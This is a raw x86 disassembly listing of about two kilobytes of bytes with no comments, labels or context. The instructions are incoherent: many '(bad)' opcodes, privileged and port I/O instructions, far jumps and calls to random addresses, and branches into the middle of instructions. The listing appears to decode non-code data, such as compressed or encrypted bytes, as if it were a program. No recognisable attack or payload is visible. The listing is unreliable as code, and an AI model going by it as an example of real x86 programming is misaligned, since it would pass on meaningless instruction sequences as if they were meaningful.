  4229df:	sub    ch,BYTE PTR [ebx+0x6c2ffb61]
  4229e5:	enter  0x7d2d,0xa1
  4229e9:	cmp    eax,0x16f914d6
  4229ee:	je     0x4229e8
  4229f0:	in     eax,dx
  4229f1:	jns    0x422988
  4229f3:	adc    esp,ecx
  4229f5:	inc    ecx
  4229f6:	cmp    esi,DWORD PTR [ecx-0x5ec2ae73]
  4229fc:	ins    DWORD PTR es:[edi],dx
  4229fd:	push   eax
  4229fe:	sub    eax,0x290cf12d
  422a03:	jnp    0x422a17
  422a05:	ss add al,0xfe
  422a08:	(bad)  
  422a0a:	xor    BYTE PTR [ebx+edi*8+0x22f9d3ec],ch
  422a11:	jmp    0x2221:0xa4f7f95f
  422a18:	push   cs
  422a19:	scas   eax,DWORD PTR es:[edi]
  422a1a:	cs repnz stos BYTE PTR es:[edi],al
  422a1d:	in     eax,0xa1
  422a1f:	lahf   
  422a20:	add    DWORD PTR [esp+eiz*4],0x64
  422a24:	cmp    BYTE PTR [edi+0x60240db2],bl
  422a2a:	mov    ebp,0x3234d16d
  422a2f:	sbb    BYTE PTR [edx+0x48fa107e],dl
  422a35:	mov    bh,BYTE PTR [edi]
  422a37:	xor    al,bl
  422a39:	aaa    
  422a3a:	int3   
  422a3b:	sub    DWORD PTR [ebx-0x4af237f0],eax
  422a41:	dec    ebp
  422a42:	xor    esp,edx
  422a44:	dec    esp
  422a45:	imul   ebx,DWORD PTR [eax-0x31],0xffffffea
  422a49:	retf   
  422a4a:	mov    ecx,0x43d5fed4
  422a4f:	mov    DWORD PTR [edx+ebp*1-0x7b56fe13],0xb54e7795
  422a5a:	push   0x98133bf6
  422a5f:	gs push ds
  422a61:	adc    ebp,DWORD PTR [esp+eax*1-0x47]
  422a65:	arpl   WORD PTR [edi-0x58],bp
  422a68:	pop    edi
  422a69:	stc    
  422a6a:	push   0xffffffeb
  422a6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a6d:	inc    esp
  422a6e:	outs   dx,DWORD PTR ds:[esi]
  422a6f:	inc    ebp
  422a70:	ins    DWORD PTR es:[edi],dx
  422a71:	not    DWORD PTR [ecx-0x6e]
  422a74:	es aam 0x85
  422a77:	push   esi
  422a78:	fcmovnb st,st(7)
  422a7a:	and    BYTE PTR [ebx+0x4088c8e4],0x4c
  422a81:	out    dx,eax
  422a82:	aas    
  422a83:	fstp   QWORD PTR [ecx]
  422a85:	(bad)  [edx]
  422a87:	xor    DWORD PTR [edi-0x29],ecx
  422a8a:	popf   
  422a8b:	into   
  422a8c:	jb     0x422a36
  422a8e:	lea    ecx,[ebx]
  422a90:	xchg   BYTE PTR [edx-0xd],dl
  422a93:	dec    ecx
  422a94:	cmp    ch,BYTE PTR [edi-0x1e]
  422a97:	aad    0xaa
  422a99:	mov    esi,0x99be3084
  422a9e:	mov    bl,0x8f
  422aa0:	add    al,0xc6
  422aa2:	jmp    0x213b304d
  422aa7:	xchg   edx,eax
  422aa8:	fiadd  DWORD PTR [ecx+edi*2+0x1]
  422aac:	stc    
  422aad:	add    eax,0xe1e053de
  422ab2:	idiv   BYTE PTR [edx+0x7e]
  422ab5:	jns    0x422a60
  422ab7:	push   esi
  422ab8:	fidiv  DWORD PTR [ebx]
  422aba:	rol    ah,1
  422abc:	hlt    
  422abd:	push   edx
  422abe:	mov    bh,0xa2
  422ac0:	(bad)  
  422ac1:	mov    bl,0x4e
  422ac3:	aaa    
  422ac4:	or     cl,0xa5
  422ac7:	mov    WORD PTR [esi+0x7b],ds
  422aca:	sbb    DWORD PTR [edx-0x30b1db79],edi
  422ad0:	fadd   QWORD PTR [ebp+0x2ed69719]
  422ad6:	cmp    bh,BYTE PTR [ecx]
  422ad8:	sub    esi,DWORD PTR [ecx+0x512350b5]
  422ade:	push   ds
  422adf:	nop
  422ae0:	test   al,0xb2
  422ae2:	fxam   
  422ae4:	add    edi,DWORD PTR [ebp-0x1e]
  422ae7:	xchg   DWORD PTR [esp+ecx*2-0x40],ebp
  422aeb:	mov    al,0x4e
  422aed:	inc    ebp
  422aee:	in     eax,0xbc
  422af0:	pop    ebx
  422af1:	mov    edx,0xe2c9cd28
  422af6:	push   cs
  422af7:	pop    ebx
  422af8:	and    ah,bl
  422afa:	mov    fs,WORD PTR [ecx]
  422afc:	ins    DWORD PTR es:[edi],dx
  422afd:	jecxz  0x422b32
  422aff:	pop    edi
  422b00:	sbb    WORD PTR [edx+0x6e855bf7],ax
  422b07:	cwde   
  422b08:	nop
  422b09:	mov    cl,0x73
  422b0b:	fwait
  422b0c:	cmp    eax,0x9cb3473e
  422b11:	push   ds
  422b12:	cs cld 
  422b14:	mov    ebx,0x7e879561
  422b19:	mov    edi,0xc63a3a2c
  422b1e:	xchg   ebp,eax
  422b1f:	dec    ecx
  422b20:	popf   
  422b21:	sbb    BYTE PTR [ebx+0x71c77f82],dl
  422b27:	jae    0x422b7a
  422b29:	pop    ebp
  422b2a:	fstp   TBYTE PTR [eax+0x499a6bd8]
  422b30:	inc    ebp
  422b31:	call   0xe181:0x8f33e34a
  422b38:	stc    
  422b39:	pop    esi
  422b3a:	push   es
  422b3b:	into   
  422b3c:	repnz add eax,0x8229a45b
  422b42:	in     eax,0xa5
  422b44:	imul   ecx,DWORD PTR [edi-0x56],0x60
  422b48:	hlt    
  422b49:	mov    ah,0x1b
  422b4b:	inc    esi
  422b4c:	xor    edi,DWORD PTR [ebx-0x660c55e]
  422b52:	mov    bl,0xc
  422b54:	cmp    eax,0x84eb301
  422b59:	or     eax,0x2c249b8f
  422b5e:	cmp    eax,0x7a8fab21
  422b63:	jl     0x422b1c
  422b65:	push   esi
  422b66:	dec    esp
  422b67:	jle    0x422af1
  422b69:	outs   dx,BYTE PTR ds:[esi]
  422b6a:	and    ebp,DWORD PTR [edi-0x29]
  422b6d:	outs   dx,DWORD PTR ds:[esi]
  422b6e:	pushf  
  422b6f:	xor    eax,0x12168e14
  422b74:	rcr    BYTE PTR [edi+eax*1+0x54b6361e],0x46
  422b7c:	hlt    
  422b7d:	jge    0x422bee
  422b7f:	into   
  422b80:	je     0x422b5d
  422b82:	xor    DWORD PTR [eax-0x17],ebx
  422b85:	add    DWORD PTR [edi+0x5a7ab8fe],ebp
  422b8b:	sbb    DWORD PTR [eax+0x9874872],0xffffffff
  422b92:	mov    dl,0x2d
  422b94:	divps  xmm2,xmm1
  422b97:	mov    cs,WORD PTR [eax]
  422b99:	pop    ebp
  422b9a:	inc    edx
  422b9b:	(bad)  
  422b9c:	sub    esp,ebx
  422b9e:	hlt    
  422b9f:	ficom  DWORD PTR [edi]
  422ba1:	scas   al,BYTE PTR es:[edi]
  422ba2:	je     0x422b5c
  422ba4:	je     0x422b62
  422ba6:	or     eax,0xa026ecfb
  422bab:	xlat   BYTE PTR ds:[ebx]
  422bac:	mov    ecx,0x3a43dc05
  422bb1:	lock ss out 0xb4,eax
  422bb5:	leave  
  422bb6:	and    al,0x85
  422bb8:	mov    ds:0xf37747fc,eax
  422bbd:	mov    cl,BYTE PTR [ebx]
  422bbf:	pop    ds
  422bc0:	iret   
  422bc1:	adc    bl,BYTE PTR [edx-0x5]
  422bc4:	jl     0x422ba0
  422bc6:	aad    0x89
  422bc8:	test   DWORD PTR ds:0x80435afb,0xfe702181
  422bd2:	sub    ecx,DWORD PTR [edx-0x4e161117]
  422bd8:	sub    BYTE PTR [ebp+0x3edda0d4],0x23
  422bdf:	xchg   esp,eax
  422be0:	dec    esp
  422be1:	(bad)
  422be4:	fwait
  422be5:	pop    eax
  422be6:	retf   
  422be7:	jmp    0xb93fb6ca
  422bec:	and    BYTE PTR [ebx+edi*8+0x154bb1aa],ah
  422bf3:	ds jecxz 0x422bec
  422bf6:	xor    BYTE PTR [ebp-0x3b],0xb9
  422bfa:	iret   
  422bfb:	mov    cr7,edi
  422bfe:	pop    es
  422bff:	xor    BYTE PTR [esi],ah
  422c01:	loope  0x422c7b
  422c03:	fdiv   QWORD PTR ds:0xcd1318ca
  422c09:	gs xor edx,ecx
  422c0c:	xor    ecx,esp
  422c0e:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  422c10:	mov    bh,0x2c
  422c12:	mov    ebp,0x34f6b412
  422c17:	mov    ch,BYTE PTR [ebx-0x17004096]
  422c1d:	jbe    0x422c1f
  422c1f:	mov    es,WORD PTR ds:0x55d6116
  422c25:	leave  
  422c26:	imul   esp,DWORD PTR ds:0xeddc9354,0xaaa7e20b
  422c30:	jmp    0x422c58
  422c32:	mov    esi,0xf7a4c7bf
  422c37:	idiv   edx
  422c39:	test   ecx,edi
  422c3b:	dec    edx
  422c3c:	dec    ecx
  422c3d:	and    dl,0xb7
  422c40:	sub    al,0x75
  422c42:	loop   0x422beb
  422c44:	outs   dx,BYTE PTR ds:[esi]
  422c45:	ins    BYTE PTR es:[edi],dx
  422c46:	lea    esi,[esi-0x538e6fa]
  422c4c:	xchg   ebx,eax
  422c4d:	lods   eax,DWORD PTR ds:[esi]
  422c4e:	and    BYTE PTR [esp+esi*4+0x47],0x99
  422c53:	test   cl,0x34
  422c56:	call   0x47ed5fd5
  422c5b:	fmul   st(7),st
  422c5d:	mov    dh,0xcd
  422c5f:	and    DWORD PTR [edx+0x2ecdfa65],ebp
  422c65:	mov    ss,WORD PTR [edx+0xb0029b7]
  422c6b:	and    esp,DWORD PTR [ecx+0x25dbb613]
  422c71:	ja     0x422c52
  422c73:	or     BYTE PTR [ecx-0x7637031d],bh
  422c79:	test   DWORD PTR [ebp+0x5a],esi
  422c7c:	mov    es,WORD PTR [eax+0x7e]
  422c7f:	inc    ebx
  422c80:	fwait
  422c81:	mov    DWORD PTR [edi+0x449c6b8c],edi
  422c87:	or     dh,ah
  422c89:	cwde   
  422c8a:	adc    ebx,DWORD PTR [edi+ebp*2]
  422c8d:	inc    ebx
  422c8e:	adc    BYTE PTR [edx],dh
  422c90:	push   ebp
  422c91:	lds    ebp,FWORD PTR [eax+0x44bd14b4]
  422c97:	inc    ecx
  422c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c99:	and    BYTE PTR [ebp-0x3476fe69],dl
  422c9f:	or     BYTE PTR ds:0xc9cbf5cb,0x46
  422ca6:	jo     0x422ce8
  422ca8:	and    eax,0xe205d158
  422cad:	or     BYTE PTR [edi-0x1a451519],0x39
  422cb4:	out    0x7c,al
  422cb6:	sbb    edx,DWORD PTR [ecx+0x53]
  422cb9:	pop    edi
  422cba:	xlat   BYTE PTR ds:[ebx]
  422cbb:	sbb    eax,0x9f5a09f4
  422cc0:	mov    dh,0xb4
  422cc2:	call   0x4b9cab58
  422cc7:	sub    bl,al
  422cc9:	push   ecx
  422cca:	test   DWORD PTR [ecx-0x75],ebp
  422ccd:	jno    0x422d2c
  422ccf:	xor    BYTE PTR [eax+ecx*1-0x39],dl
  422cd3:	inc    sp
  422cd5:	bound  edi,QWORD PTR [ebx]
  422cd7:	push   eax
  422cd8:	retf   0x84fb
  422cdb:	pusha  
  422cdc:	daa    
  422cdd:	adc    ebp,edx
  422cdf:	je     0x422d1b
  422ce1:	ror    DWORD PTR [edx+0x5],1
  422ce4:	xchg   DWORD PTR [edx-0x4],eax
  422ce7:	mov    ds:0xdb4af31f,al
  422cec:	enter  0xe92d,0xb
  422cf0:	aam    0xc0
  422cf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cf3:	loop   0x422ca5
  422cf5:	and    BYTE PTR [ecx+0x3718400d],dl
  422cfb:	pushf  
  422cfc:	xchg   esp,eax
  422cfd:	xor    dl,BYTE PTR [esi-0x3a807e20]
  422d03:	retf   
  422d04:	test   eax,0x62f205c6
  422d09:	aas    
  422d0a:	jne    0x422d10
  422d0c:	pop    esp
  422d0d:	mov    esi,0x72938f19
  422d12:	adc    eax,0x603c4b80
  422d17:	xchg   edx,eax
  422d18:	ds xchg esi,eax
  422d1a:	fs aaa 
  422d1c:	mov    bl,0x9e
  422d1e:	hlt    
  422d1f:	aaa    
  422d20:	(bad)  
  422d21:	sbb    eax,0xe56f3d3b
  422d26:	nop
  422d27:	jbe    0x422d12
  422d29:	xlat   BYTE PTR ds:[ebx]
  422d2a:	sub    bl,dl
  422d2c:	cmc    
  422d2d:	ror    DWORD PTR [edx+0x61d6b74f],cl
  422d33:	les    edx,FWORD PTR [esi-0x50318712]
  422d39:	cmp    eax,0x7ade236e
  422d3e:	xchg   edi,eax
  422d3f:	test   eax,0x1153b5a7
  422d44:	push   ebx
  422d45:	add    BYTE PTR [edx],bh
  422d47:	stos   DWORD PTR es:[edi],eax
  422d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d49:	jmp    0x87a9b7c4
  422d4e:	shl    BYTE PTR [ecx],1
  422d50:	fstp   st(6)
  422d52:	test   esp,esp
  422d54:	xchg   ebp,eax
  422d55:	dec    esp
  422d56:	fild   DWORD PTR [edi]
  422d58:	into   
  422d59:	and    al,0x90
  422d5b:	or     DWORD PTR [edx+eax*1-0x68],ebp
  422d5f:	shl    dl,1
  422d61:	in     al,dx
  422d62:	(bad)  
  422d63:	imul   ebp,ecx,0x6d41debd
  422d69:	and    ah,BYTE PTR [eax-0x461575a8]
  422d6f:	addr16 push es
  422d71:	icebp  
  422d72:	mov    es,WORD PTR [ebp+0x3b]
  422d75:	into   
  422d76:	pop    edi
  422d77:	mov    ds,WORD PTR [esi]
  422d79:	jp     0x422da7
  422d7b:	aam    0xe2
  422d7d:	mov    al,0x23
  422d7f:	test   BYTE PTR [edi-0x4d50a9fe],ch
  422d85:	dec    esp
  422d86:	dec    edi
  422d87:	(bad)  [eax+0x76]
  422d8a:	adc    BYTE PTR [edx],bl
  422d8c:	jl     0x422d49
  422d8e:	mov    eax,0xa7b3ce2c
  422d93:	xchg   edx,eax
  422d94:	xchg   ebp,eax
  422d95:	ins    BYTE PTR es:[edi],dx
  422d96:	(bad)  
  422d98:	cmp    al,BYTE PTR [eax+0x13]
  422d9b:	xchg   ebx,eax
  422d9c:	xlat   BYTE PTR ds:[ebx]
  422d9d:	mov    ecx,0x98553f13
  422da2:	or     ch,0xe1
  422da5:	inc    ecx
  422da6:	xchg   ebp,eax
  422da7:	xor    BYTE PTR [ecx+esi*1],0xc5
  422dab:	mov    BYTE PTR [ecx+0x69],bh
  422dae:	lds    ecx,FWORD PTR [eax-0x55330a0b]
  422db4:	cs loopne 0x422e35
  422db7:	dec    ecx
  422db8:	xchg   esp,eax
  422db9:	stc    
  422dba:	sbb    ebx,ecx
  422dbc:	test   esp,0xc38afc80
  422dc2:	out    0xff,al
  422dc4:	xlat   BYTE PTR ds:[ebx]
  422dc5:	push   esp
  422dc6:	jmp    0xd6f1c8f4
  422dcb:	scas   eax,DWORD PTR es:[edi]
  422dcc:	ins    BYTE PTR es:[edi],dx
  422dcd:	retf   
  422dce:	cmp    al,0xad
  422dd0:	fild   WORD PTR [edi]
  422dd2:	push   esp
  422dd3:	or     BYTE PTR [edi],0x59
  422dd6:	jmp    0x7c1c12e9
  422ddb:	sub    edi,esi
  422ddd:	sub    ch,BYTE PTR [edx-0x62cd4182]
  422de3:	mov    DWORD PTR [edx-0x31],ecx
  422de6:	ds jmp 0x516a:0xab7a8d8b
  422dee:	push   edi
  422def:	push   ds
  422df0:	jae    0x422da9
  422df2:	dec    ecx
  422df3:	pusha  
  422df4:	ins    DWORD PTR es:[edi],dx
  422df5:	xor    DWORD PTR [eax],0xffffffa8
  422df8:	jg     0x422db4
  422dfa:	mov    ebx,0x87c36c5d
  422dff:	rcl    ch,1
  422e01:	xchg   esp,eax
  422e02:	lds    eax,FWORD PTR [ecx]
  422e04:	xor    al,0x53
  422e07:	dec    edx
  422e08:	stos   BYTE PTR es:[edi],al
  422e09:	call   0x37d5:0xef821d1a
  422e10:	xchg   esp,eax
  422e11:	ja     0x422e3f
  422e13:	jg     0x422ddc
  422e15:	mov    ebx,0xfec509b5
  422e1a:	in     al,0x73
  422e1c:	and    al,0x32
  422e1e:	mov    ecx,0xf700eddc
  422e23:	push   ecx
  422e24:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e26:	loopne 0x422e50
  422e28:	jb     0x422e61
  422e2a:	adc    DWORD PTR [esi],0xffffff88
  422e2d:	xchg   ecx,eax
  422e2e:	dec    esi
  422e2f:	xchg   esp,eax
  422e30:	pusha  
  422e31:	nop    DWORD PTR [esi]
  422e34:	(bad)  
  422e35:	daa    
  422e36:	fcomp  DWORD PTR [esp]
  422e39:	test   BYTE PTR [ebx],0xa6
  422e3c:	fs aam 0x2a
  422e3f:	cmp    dh,BYTE PTR [edx]
  422e41:	clc    
  422e42:	sbb    BYTE PTR [esp+eax*2],0x81
  422e46:	xlat   BYTE PTR ds:[ebx]
  422e47:	cli    
  422e48:	leave  
  422e49:	data16 lods al,BYTE PTR ds:[esi]
  422e4b:	pop    ss
  422e4c:	push   esp
  422e4d:	mov    eax,0x28156d14
  422e52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e53:	sub    dl,ah
  422e55:	jbe    0x422df6
  422e57:	mov    ebp,0xf3b841f5
  422e5c:	dec    esp
  422e5d:	sbb    eax,0x2f3093b3
  422e62:	mov    edi,0x8622dfff
  422e67:	inc    eax
  422e68:	inc    ecx
  422e69:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  422e6b:	cmp    BYTE PTR [esi-0x381cfcb9],cl
  422e71:	pop    ebx
  422e72:	leave  
  422e73:	mov    bh,0x86
  422e75:	inc    esp
  422e76:	repz out dx,al
  422e78:	ins    BYTE PTR es:[edi],dx
  422e79:	retf   
  422e7a:	retf   
  422e7b:	jle    0x422ed9
  422e7d:	pop    edx
  422e7e:	cmp    DWORD PTR [edx+edx*1-0x57],0xffffff9b
  422e83:	ds sub eax,0x6d7c1d6d
  422e89:	test   ch,ah
  422e8b:	repz pop ebx
  422e8d:	icebp  
  422e8e:	push   edx
  422e8f:	loopne 0x422e91
  422e91:	rol    bh,1
  422e93:	in     al,dx
  422e94:	mov    eax,0x4e839f60
  422e99:	loopne 0x422e1d
  422e9b:	dec    esi
  422e9c:	fcmovbe st,st(5)
  422e9e:	pushf  
  422e9f:	inc    eax
  422ea0:	inc    ecx
  422ea1:	out    0x57,al
  422ea3:	popf   
  422ea4:	fcmovne st,st(2)
  422ea6:	xor    DWORD PTR [edx],ebx
  422ea8:	jo     0x422f1b
  422eaa:	or     ebp,DWORD PTR ds:0x8677942e
  422eb0:	fbld   TBYTE PTR [ecx]
  422eb2:	ja     0x422eab
  422eb4:	fldcw  WORD PTR [ecx-0x51]
  422eb7:	xor    dh,BYTE PTR ds:0xc5ae4781
  422ebd:	mov    ebx,0x5c20a399
  422ec2:	popa   
  422ec3:	in     eax,0x70
  422ec5:	cli    
  422ec6:	cdq    
  422ec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ec8:	fsubp  st(1),st
  422eca:	inc    edi
  422ecb:	and    DWORD PTR ss:[ebx+0x191d47eb],ebx
  422ed2:	icebp  
  422ed3:	out    0x34,eax
  422ed5:	xchg   esi,ebp
  422ed7:	lahf   
  422ed8:	mov    esi,0xf8f05b0b
  422edd:	aad    0x16
  422edf:	mov    bh,0xb2
  422ee1:	out    dx,al
  422ee2:	mov    bl,0xb2
  422ee4:	fbld   TBYTE PTR [ebp+0xa817b4e]
  422eea:	pop    ebx
  422eeb:	xchg   esp,eax
  422eec:	push   esp
  422eed:	pushf  
  422eee:	popa   
  422eef:	xchg   ecx,eax
  422ef0:	push   0x6e
  422ef2:	or     cl,BYTE PTR [ebp+0x2d]
  422ef5:	dec    edi
  422ef6:	test   al,0xa9
  422ef8:	outs   dx,DWORD PTR ds:[esi]
  422ef9:	mov    ds:0x162fd4d2,al
  422efe:	int3   
  422eff:	not    DWORD PTR [ecx-0x6c]
  422f02:	pop    ds
  422f03:	push   0x21d1f3c4
  422f08:	fwait
  422f09:	sub    eax,0x9532f56f
  422f0e:	loopne 0x422e96
  422f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f11:	call   0x4cca:0x3975d9d8
  422f18:	into   
  422f19:	pop    es
  422f1a:	pop    ebx
  422f1b:	jo     0x422f3a
  422f1d:	out    dx,eax
  422f1e:	mov    ebx,0x8cccc0b0
  422f23:	call   0xda50:0xb84949c5
  422f2a:	shr    BYTE PTR [esi+eax*8],0x9a
  422f2e:	pop    ss
  422f2f:	cmp    bl,BYTE PTR [eax+eiz*1-0x39]
  422f33:	aad    0x81
  422f35:	pop    esi
  422f36:	js     0x422f6f
  422f38:	xchg   esi,eax
  422f39:	sbb    eax,0x903a3b4a
  422f3e:	test   BYTE PTR [edi],ch
  422f40:	or     ecx,esp
  422f42:	and    eax,DWORD PTR [ecx-0x13468dbb]
  422f48:	add    DWORD PTR [ebx-0x43],ebx
  422f4b:	jns    0x422f6f
  422f4d:	lea    edx,[ebx+edi*2+0x2d]
  422f51:	push   esi
  422f52:	(bad)  
  422f53:	cmc    
  422f54:	(bad)  
  422f55:	faddp  st(4),st
  422f57:	inc    eax
  422f58:	cli    
  422f59:	fstp   QWORD PTR [eax]
  422f5b:	inc    eax
  422f5c:	cwde   
  422f5d:	jmp    0xddaf:0x86e46b63
  422f64:	dec    eax
  422f65:	and    eax,0x732600e1
  422f6a:	mov    cl,0xa4
  422f6c:	push   edi
  422f6d:	in     al,dx
  422f6e:	pop    ecx
  422f6f:	jnp    0x422fc7
  422f71:	xor    al,0xdb
  422f73:	out    0x19,eax
  422f75:	pop    ebp
  422f76:	call   0x21d9dfcb
  422f7b:	cli    
  422f7c:	push   esi
  422f7d:	stos   DWORD PTR es:[edi],eax
  422f7e:	xchg   edi,eax
  422f7f:	jecxz  0x422fd7
  422f81:	mov    eax,ds:0xc39cf4c1
  422f86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f87:	jnp    0x422fd3
  422f89:	std    
  422f8a:	lock mov ebx,0x8cb10916
  422f90:	pop    eax
  422f91:	popf   
  422f92:	ss or  al,0x4b
  422f95:	xchg   esp,eax
  422f96:	xchg   edx,eax
  422f97:	enter  0x966d,0x16
  422f9b:	data16 adc al,0x81
  422f9e:	or     DWORD PTR [ecx-0x3d33e182],0xe3786d7c
  422fa8:	je     0x422fa3
  422faa:	jle    0x422fe1
  422fac:	(bad)  [ecx]
  422fae:	mov    esi,0x91803662
  422fb3:	xor    BYTE PTR ds:[si+0x7c6e],0xe6
  422fba:	push   edx
  422fbb:	jno    0x423033
  422fbd:	adc    DWORD PTR ds:[ebp*2+0x2eebdbb0],ecx
  422fc5:	rol    BYTE PTR [ecx+eiz*4],cl
  422fc8:	push   ebx
  422fc9:	xchg   edi,eax
  422fca:	(bad)  
  422fcb:	ja     0x422fcb
  422fcd:	xchg   ebp,eax
  422fce:	loop   0x422f7b
  422fd0:	aad    0xbf
  422fd2:	jbe    0x422fa8
  422fd4:	out    dx,eax
  422fd5:	adc    al,0xfd
  422fd7:	xor    ah,bh
  422fd9:	adc    al,0x6f
  422fdb:	ret    
  422fdc:	iret   
  422fdd:	mov    bl,0x6b
  422fdf:	aas    
  422fe0:	xor    al,0xe8
  422fe2:	add    BYTE PTR [edi+eiz*1+0x12ab0997],ah
  422fe9:	pop    ebp
  422fea:	arpl   WORD PTR [edi+ebp*2-0x584dfad4],si
  422ff1:	in     al,dx
  422ff2:	aaa    
  422ff3:	mov    ebp,0x7d940272
  422ff8:	ds pop ebx
  422ffa:	push   edx
  422ffb:	sbb    eax,0x91875c95
  423000:	xchg   ebx,eax
  423001:	jno    0x422f8f
  423003:	jmp    0x423025
  423005:	cs mov ecx,0x1c6dc23d
  42300b:	(bad)  
  42300c:	aam    0x5c
  42300e:	rol    ebp,1
  423010:	sub    dh,ah
  423012:	fwait
  423013:	push   esi
  423014:	xor    DWORD PTR [ebx],ebx
  423016:	fwait
  423017:	pushf  
  423018:	jle    0x422fa6
  42301a:	jmp    0x2a8e3391
  42301f:	jae    0x422fde
  423021:	shr    edx,1
  423023:	mov    eax,DWORD PTR [edx-0x57]
  423026:	and    esp,DWORD PTR [edi]
  423028:	push   ds
  423029:	sbb    eax,0x95874281
  42302e:	mov    ebp,0xd4c81cb6
  423033:	clc    
  423034:	sbb    eax,0x623d5b25
  423039:	icebp  
  42303a:	popf   
  42303b:	aaa    
  42303c:	scas   al,BYTE PTR es:[edi]
  42303d:	sbb    DWORD PTR [esi+ebp*1-0x58e12002],ebx
  423044:	sbb    bl,dl
  423046:	mov    ebx,0x339fe408
  42304b:	sbb    dl,ch
  42304d:	test   BYTE PTR [edi+0x17],al
  423050:	stos   BYTE PTR es:[edi],al
  423051:	xor    edi,DWORD PTR [ecx]
  423053:	loopne 0x423044
  423055:	mov    edx,0x16eac8d
  42305a:	push   ebx
  42305b:	enter  0x6f96,0x96
  42305f:	in     eax,0x7e
  423061:	fxch   st(2)
  423063:	mov    ch,0x2e
  423065:	mov    ch,0x6c
  423067:	leave  
  423068:	scas   eax,DWORD PTR es:[edi]
  423069:	leave  
  42306a:	xor    eax,esi
  42306c:	shl    ebp,1
  42306e:	test   BYTE PTR [edx+0x2d682c74],ch
  423074:	sbb    ebx,edx
  423076:	push   esi
  423077:	fcom   QWORD PTR [edi]
  423079:	bound  esp,QWORD PTR [esi-0x6c]
  42307c:	rol    edx,1
  42307e:	push   edi
  42307f:	ret    
  423080:	lds    ebp,FWORD PTR [ebx]
  423082:	adc    ebx,0x58
  423085:	adc    al,0xd9
  423087:	add    eax,0x4d9030b
  42308c:	xchg   esp,ebx
  42308e:	sub    ch,BYTE PTR [eax-0x41]
  423091:	xor    al,bh
  423093:	(bad)  
  423094:	cs push edx
  423096:	test   BYTE PTR [eax],bh
  423098:	mov    dh,0x32
  42309a:	retf   
  42309b:	or     DWORD PTR [ebp+0x1e],esp
  42309e:	in     al,dx
  42309f:	repnz mov ebx,0xa4c31ab0
  4230a5:	mov    ebx,0x355607a1
  4230aa:	repz push esp
  4230ac:	inc    ecx
  4230ad:	mov    BYTE PTR [ebx+ecx*1+0x733a321c],ah
  4230b4:	push   ebp
  4230b5:	les    ebx,FWORD PTR [edx+0x5a902868]
  4230bb:	js     0x4230f2
  4230bd:	and    eax,0xb5ab3a65
  4230c2:	pop    edi
  4230c3:	mov    bl,0xfb
  4230c5:	aad    0xc5
  4230c7:	pop    edx
  4230c8:	std    
  4230c9:	adc    esi,DWORD PTR [esp]
  4230cc:	add    BYTE PTR [edx],0x77
  4230cf:	dec    esp
  4230d0:	xor    DWORD PTR [esi-0x548fc8e3],eax
  4230d6:	(bad)  
  4230d7:	sti    
  4230d8:	mov    esp,0xea9d8ae9
  4230dd:	adc    DWORD PTR [esp+esi*8-0x30],edi
  4230e1:	inc    esp
  4230e2:	inc    esp
  4230e3:	mov    al,ds:0x9d2c1733
  4230e8:	mov    ecx,edi
  4230ea:	jl     0x42315d
  4230ec:	jmp    0xc123c6c6
  4230f1:	arpl   WORD PTR [edx+0x71],ax
  4230f4:	add    esi,ebx
  4230f6:	xchg   edx,eax
  4230f7:	pusha  
	...
  42313c:	add    BYTE PTR [eax],al
  42313e:	aad    0x80
  423140:	pusha  
  423141:	cld    
  423142:	jne    0x423140
  423144:	(bad)  [ecx+0x32bc8e94]
  42314a:	mov    al,0x16
  42314c:	pop    ebx
  42314d:	or     al,0xb3
  42314f:	and    DWORD PTR [ecx],eax
  423151:	add    BYTE PTR [edx],ah
  423153:	pop    es
  423154:	add    BYTE PTR [eax],al
  423156:	adc    eax,0x820b9aa3
  42315b:	push   ebp
  42315c:	outs   dx,BYTE PTR ds:[esi]
  42315e:	loopne 0x4231bf
  423160:	cmp    BYTE PTR [ecx],ah
  423162:	mov    al,ds:0x6d3f59d0
  423167:	pop    ecx
  423168:	adc    BYTE PTR [ebx],0xc5
  42316b:	outs   dx,DWORD PTR ds:[esi]
  42316c:	daa    
  42316d:	mov    eax,ds:0x98a81e88
  423172:	fisub  DWORD PTR [edi-0x44]
  423175:	and    ebx,DWORD PTR [ebx]
  423177:	aam    0x62
  423179:	cmp    cl,BYTE PTR [edx]
  42317b:	wbinvd 
  42317d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42317e:	mov    ebp,0x40b8cdbf
  423183:	mov    al,0x3e
  423185:	jp     0x423113
  423187:	ret    0xdb95
  42318a:	inc    ebp
  42318b:	loop   0x423149
  42318d:	fisttp DWORD PTR [edi-0x72]
  423190:	jae    0x4231b2
  423192:	sbb    edx,ebp
  423194:	dec    ebp
  423195:	jmp    0x4231fc
  423197:	xchg   esi,eax
  423198:	jge    0x42316d
  42319a:	xor    DWORD PTR [ebp+0x1e],ebp
  42319d:	cmp    DWORD PTR [edi+0x3d96815],esi
  4231a3:	mov    dh,0x98
  4231a5:	push   eax
  4231a6:	cmp    al,0xd9
  4231a8:	push   cs
  4231a9:	out    dx,al
  4231aa:	aad    0x73
  4231ac:	add    edi,DWORD PTR [esi-0x3d]
  4231af:	add    esi,DWORD PTR [ebx+0x52d91b42]
  4231b5:	or     ebp,DWORD PTR [eax-0x78cda76b]
  4231bb:	ss stos DWORD PTR es:[edi],eax
  4231bd:	mov    dl,0xa3
  4231bf:	in     eax,0xc9
  4231c1:	and    BYTE PTR [eax],dl
  4231c3:	outs   dx,DWORD PTR ds:[esi]
  4231c4:	pop    edx
  4231c5:	stos   BYTE PTR es:[edi],al
  4231c6:	push   esp
  4231c7:	sbb    DWORD PTR [ebx],0x19
  4231ca:	xchg   esi,eax
  4231cb:	cld    
  4231cc:	mov    cl,0x40
  4231ce:	dec    ebx
  4231cf:	jmp    0x6d02:0x5fdef5c4
  4231d6:	pop    edx
  4231d7:	shl    dl,cl
  4231d9:	cwde   
  4231da:	jmp    0x423162
  4231dc:	mov    ch,0xed
